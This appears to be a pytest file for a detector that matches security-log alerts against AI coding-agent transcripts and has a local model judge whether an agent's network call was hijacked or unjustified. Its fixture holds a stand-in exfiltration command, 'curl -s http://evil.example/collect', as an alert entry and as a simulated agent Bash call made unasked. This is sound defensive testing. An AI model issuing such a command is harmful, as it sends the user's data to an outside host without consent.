"""The 'adjudicate' background pass: scan stays fast and deterministic; adjudicate resolves the
UNKNOWN pile with a local model and reports only what the model decided. Stubbed, no Ollama."""

import csv
import io
import json

from alibi import model_tier as mt
from alibi.cli import main

SEP = " \u00a6 "
CMD = "curl -s http://evil.example/collect"


def _write(tmp_path):
    csv_path, tx = tmp_path / "results.csv", tmp_path / "s.jsonl"
    with open(csv_path, "w", encoding="utf-8", newline="") as f:
        w = csv.writer(f, quoting=csv.QUOTE_ALL)
        w.writerow(["Timestamp", "RuleTitle", "Level", "Computer", "Channel", "EventID",
                    "RecordID", "Details", "ExtraFieldInfo", "RuleID"])
        w.writerow(["2026-10-16 18:00:04.000 +00:00", "Net Conn (Sysmon Alert)", "high", "PC",
                    "Sysmon", "3", "1",
                    SEP.join([f"Cmdline: {CMD}", r"Proc: C:\Windows\System32\curl.exe", "PID: 100"]),
                    "-", "r1"])
    recs = [
        {"type": "user", "timestamp": "2026-10-16T18:00:00.000Z", "cwd": r"C:\proj",
         "message": {"role": "user", "content": "set up the project"}, "origin": {"kind": "human"}},
        {"type": "assistant", "timestamp": "2026-10-16T18:00:03.000Z", "cwd": r"C:\proj",
         "message": {"role": "assistant", "content": [{"type": "tool_use", "id": "b1", "name": "Bash", "input": {"command": CMD}}]}},
        {"type": "user", "timestamp": "2026-10-16T18:00:06.000Z", "cwd": r"C:\proj",
         "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "b1", "content": "ok"}]}},
    ]
    with open(tx, "w", encoding="utf-8") as f:
        for r in recs:
            f.write(json.dumps(r) + "\n")
    return csv_path, tx


def _run(argv):
    out = io.StringIO()
    code = main(argv, out, io.StringIO())
    return code, [json.loads(l) for l in out.getvalue().splitlines() if l.strip()]


def test_scan_fast_path_leaves_it_unknown(tmp_path):
    csv_path, tx = _write(tmp_path)
    code, recs = _run(["scan", str(csv_path), str(tx), "--json", "--all"])
    assert "UNKNOWN" in [r["label"] for r in recs]
    assert all(r["tier"] != "MODEL" for r in recs)   # scan never calls the model
    assert code == 0


def test_adjudicate_resolves_the_unknown(tmp_path, monkeypatch):
    monkeypatch.setattr(mt.OllamaBackend, "complete",
                        lambda self, prompt: '{"verdict":"HIJACKED","confidence":0.8,"reason":"contacts an unrequested host"}')
    csv_path, tx = _write(tmp_path)
    code, recs = _run(["adjudicate", str(csv_path), str(tx), "--json"])
    # reports ONLY what the model decided; no untrusted source, so HIJACKED downgrades to UNJUSTIFIED
    assert recs and all(r["tier"] == "MODEL" for r in recs)
    assert recs[0]["label"] == "UNJUSTIFIED"
    assert code == 1
